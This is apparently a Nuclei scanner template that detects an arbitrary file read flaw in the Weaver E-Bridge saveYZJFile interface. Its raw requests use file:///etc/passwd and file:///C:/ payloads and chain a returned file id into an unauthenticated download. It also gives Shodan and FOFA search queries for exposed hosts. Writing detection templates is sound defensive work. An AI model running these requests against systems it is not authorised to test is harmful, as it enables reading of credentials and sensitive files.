id: weaver-ebridge-lfi

info:
  name: Weaver E-Bidge saveYZJFile - Local - 任意文件读取漏洞
  author: SleepingBag945
  severity: high
  description: |
    该模板用于检测 Weaver E-Bidge saveYZJFile - Local - 任意文件读取漏洞。该类漏洞通常源于文件路径、下载参数或资源加载接口缺少目录穿越和权限校验，导致任意文件被读取或包含。模板会向 `/wxjsapi/saveYZJFile?fileName=test&downloadUrl={{path}}`、`/file/fileNoLogin/{{idname}}` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可读取配置文件、源码、日志、密钥或系统敏感文件。
    - 若文件包含点可被利用，可能进一步造成代码执行、凭据泄露或对内部系统的持续入侵。
  remediation: |
    - 对文件访问参数使用固定映射或白名单，禁止直接使用用户输入拼接文件路径。
    - 规范化并校验最终路径，阻断 `../`、编码绕过和绝对路径访问。
    - 限制应用进程的文件系统权限，避免配置、密钥和日志被 Web 服务账号读取。
  reference:
    - https://peiqi.wgpsec.org/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Bridge%20saveYZJFile%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html
  classification:
    cwe-id: CWE-22,CWE-73
  metadata:
    verified: true
    max-request: 4
    shodan-query: eBridge_JSessionid
    fofa-query: app="泛微云桥e-Bridge"
  tags: ebridge,weaver,oa,lfi,lfr,intrusive,vuln

http:
  - raw:
      - |
        GET /wxjsapi/saveYZJFile?fileName=test&downloadUrl={{path}} HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /file/fileNoLogin/{{idname}} HTTP/1.1
        Host: {{Hostname}}

    attack: pitchfork
    payloads:
      path:
        - file:///C:/&fileExt=txt
        - file:///etc/passwd&fileExt=txt

    stop-at-first-match: true
    skip-variables-check: true
    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200 && contains_all(body_1,'id', 'filepath') && !contains(tolower(body), 'status\":\"error')"
          - "status_code_2 == 200 && contains(header_2, 'filename=')"
          - "contains(body_2, 'Program Files') || regex('root:.*:0:0:', body)"
        condition: and

    extractors:
      - type: regex
        name: idname
        internal: true
        group: 1
        regex:
          - '"id":"(.*?)"'
